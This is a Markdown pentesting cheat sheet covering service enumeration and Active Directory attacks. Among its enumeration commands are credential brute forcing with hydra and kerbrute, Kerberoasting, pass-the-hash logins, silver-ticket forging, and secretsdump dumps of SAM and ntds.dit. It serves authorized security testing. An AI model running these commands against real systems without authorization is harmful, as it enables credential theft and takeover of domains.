---
title: "Offensive Security Notes"
author: ["aeo", "Pentesting Notes"]
date: "2023-10-05"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Pentesting Notes"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Offensive Security

## Introduction

In the ever-evolving landscape of cybersecurity, offensive security techniques play a pivotal role in identifying vulnerabilities and fortifying the digital defenses of organizations. This document serves as a comprehensive guide to the intricate realm of offensive security, focusing on advanced enumeration techniques and the subsequent exploration of potential exploitation paths. By delving into the technical intricacies of network reconnaissance, service enumeration, and vulnerability assessment, this document equips security professionals with the knowledge and tools necessary to proactively identify and mitigate threats in an increasingly hostile digital environment.

## Recommendations

I recommend to use this document as a supplement to your existing notes. 

# Methodologies
Test
## Service Enumeration
### 21 - Pentesting FTP

#### Commands
```shell
ftp -A IP
FTP> anonymous
# List all files (even hidden) (yes, they could be hidden)
FTP> ls -a 
#Set transmission to binary instead of ascii
FTP> binary 
#Set transmission to ascii instead of binary
FTP> ascii 
#exit
FTP> bye
```
#### Brute Force
FTP Default Creds List
[Github: Default Credential List](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)

```shell
# For colon separated file:
hydra -V -C FILE ftp://IP
# For separated list
hydra -L UFILE -P PFILE -V ftp://IP
# download all files on FTP
wget -m ftp://anonymous:anonymous@IP
# download all files no-passive on FTP
wget -m --no-passive ftp://anonymous:anonymous@IP
```
[Hacktricks: FTP Enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
### 22 - Pentesting SSH/SFTP
#### Enumeration
```shell
# banner grabbing
nc -vn IP 22
```
#### Credential Lists
[SSH Credential List #1](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)
[SSH Top 20 Passwords](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt)
#### Tooling
[SSH-Audit Client & Server](https://github.com/jtesta/ssh-audit)
### 69/UDP TFTP/Bittorrent-tracker

#### Enumeration
```shell
# Enumerate tftp 
nmap -n -Pn -sU -p69 -sV --script tftp-enum IP
```
```python
import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download("filename in server", "/tmp/filename", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)
```
### 23 - Pentesting Telnet
#### Enumeration
```bash
# banner grabbing
nc -vn IP 23
# nmap enumeration
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 IP
# interesting files
/etc/inetd.conf
/etc/xinetd.d/telnet
/etc/xinetd.d/stelnet
```
### 143,993 - Pentesting IMAP

#### Introduction
By default, the IMAP protocol works on two ports:
* Port 143 - this is the default IMAP non-encrypted port
* Port 993 - this is the port you need to use if you want to connect using IMAP securely

#### Enumeration
```shell
# nc - banner grabbing
nc -nv IP 143
# openssl - banner grabbing
openssl s_client -connect IP:993 -quiet
# NTLM Auth - Information Disclosure
telnet IP 143
# nmap - NTLM Auth Information Disclosure
nmap -p 143 --script=imap-ntlm-info IP
```

IMAP - Syntax
```shell
Login
    A1 LOGIN username password
Values can be quoted to enclose spaces and special characters. A " must then be escape with a \
    A1 LOGIN "username" "password"

List Folders/Mailboxes
    A1 LIST "" *
    A1 LIST INBOX *
    A1 LIST "Archive" *

Create new Folder/Mailbox
    A1 CREATE INBOX.Archive.2012
    A1 CREATE "To Read"

Delete Folder/Mailbox
    A1 DELETE INBOX.Archive.2012
    A1 DELETE "To Read"

Rename Folder/Mailbox
    A1 RENAME "INBOX.One" "INBOX.Two"

List Subscribed Mailboxes
    A1 LSUB "" *

Status of Mailbox (There are more flags than the ones listed)
    A1 STATUS INBOX (MESSAGES UNSEEN RECENT)

Select a mailbox
    A1 SELECT INBOX

List messages
    A1 FETCH 1:* (FLAGS)
    A1 UID FETCH 1:* (FLAGS)

Retrieve Message Content
    A1 FETCH 2 body[text]
    A1 FETCH 2 all
    A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])

Close Mailbox
    A1 CLOSE

Logout
    A1 LOGOUT
```
[Reference: IMAP](https://donsutherland.org/crib/imap)
### 111/TCP/UDP - Pentesting Portmapper
### 161,162,10161,10162/udp - Pentesting SNMP
#### Information
SNMPv1: Main one, it is still the most frequent, the authentication is based on a string (community string) that travels in plain-text (all the information travels in plain text). Version 2 and 2c send the traffic in plain text also and uses a community string as authentication.

SNMPv3: Uses a better authentication form and the information travels encrypted using (dictionary attack could be performed but would be much harder to find the correct creds than in SNMPv1 and v2).

#### Enumeration

```shell
# brute-force community strings with nmap
nmap -sU --script snmp-brute IP
# brute-force community strings with hydra by a custom-wordlist
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt IP snmp

# install mibs
sudo apt update && apt install snmp-mibs-downloader
# Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
sudo vi /etc/snmp/snmp.conf
# search for a specific communitry string
snmpwalk -v VERSION_SNMP -c COMM_STRING DIR_IP
# search for community strings with extended functionality
snmpwalk -v VERSION_SNMP -c COMM_STRING DIR_IP NET-SNMP-EXTEND-MIB::nsExtendObjects
# snmpwalk equivalent with nmap
nmap --script "snmp* and not snmp-brute" IP
# use snmpwalk public community string with extended MIB
snmpwalk -v X -c public IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

```

#### Source
[Hacktricks: SNMP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
[OID Database](http://www.oid-info.com/cgi-bin/display?tree=#focus)
### 139,445 - Pentesting SMB

#### Enumeration
```shell
# enum4linux - SMB Env Information
enum4linux -a [-u "<username>" -p "<passwd>"] IP
# nmap - SMB Env Information
nmap --script "safe or smb-enum-*" -p 445 IP
# rpcclient - no credentials
rpcclient -U "" -N IP
# rpcclient - login via NTLM hash
rpcclient //domain.tld -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
# dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]IP
# CME - User Enumeration
crackmapexec smb IP --users [-u <username> -p <password>]
# CME - Group Enumeration
crackmapexec smb IP --groups [-u <username> -p <password>]
# CME - Logged On User
crackmapexec smb IP --groups --loggedon-users [-u <username> -p <password>]
# Impacket - Enumerate Local User
lookupsid.py -no-pass example.tld

# map RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
#### rpcclient enumeration
What is a RID
A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects.
[Reference: RPCClient Enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration)

```shell
# communicates with the Security Account Manager Remote (SAMR)
# list system user accounts, available resource shares
python3 samrdump.py test.local/john:password123@IP
```
### 3306 - Pentesting Mysql

#### Commands
```bash
# local login
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
# remote login
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
# mysql enumeration
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
#version
select version();
#User
select user();
#database name
select database();
```

#### MySQL - Permission
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root'; 
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```




## PE Enumeration

### Active Directory Domain

```bash
# Get AD Users
python3 GetADUsers.py -all domain.tld/john:password123 -dc-ip 10.10.10.1
# Kerberos Enum User
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='domain.tld',userdb=usernames.txt 10.10.10.1
# Kerbrute enumerate usernames
kerbrute userenum -d domain.tld usernames.txt
# Kerbrute spray password across usernames
kerbrute passwordspray -d domain.tld domain_users.txt password123
# Kerbrute spray username across passwords
kerbrute bruteuser -d domain.tld passwords.txt john
# kerberoastable users (users with SPN, ticket is returned to crack)
Rubeus.exe kerberoast /outfile:hashes.txt
# AS-Reproast
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
# Rubeus-Brute through Kerberos PreAuth
Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:domain.tld /outfile:found_passwords.txt
# requests Kerberos ticket
Rubeus.exe asktgt /domain:domain.tld /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
# request Service Ticket save it as ccache
python3 getST.py -hashes :NTHASH -spn www/server01.domain.tld -dc-ip 10.10.10.1 -impersonate Administrator domain.tld/john
# requests Kerberos ticket
python3 getTGT.py domain.tld/john -dc-ip 10.10.10.1 -hashes :NTHASH
# list users with SPN attribute set and attempt to set SPN if SPN attribute is not set
python3 targetedKerberoast.py -d domain.tld -u user -p password --dc-ip 10.10.10.1
# output a TGT into the specified ccache
python3 gettgtpkinit.py domain.tld/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache
# request a TGS for yourself using Kerberos U2U, get as-rep key from gettgtpkinit.py
KRB5CCNAME=out.ccache
python3 getnthash.py domain.tld/DC01\$ -key <as-rep key>
# craft silver ticket for a specific service
python3 ticketer.py -nthash <NTHASH> -domain-sid <SID> -domain domain.tld -dc-ip 10.10.10.1 -spn cifs/domain.tld john
# Dump SAM & SYSTEM
python3 secretsdump.py domain.tld/john:password123@10.10.10.1
# dump ntds.dit
python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 domain.tld/john:password123@10.10.10.2
# fetch Service Principal Names that are associated with normal user accounts
python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
# monitor real-time changes to the LDAP objects
SharpLDAPmonitor.exe /dcip:10.10.10.1 /user:domain.tld\john /pass:password123

```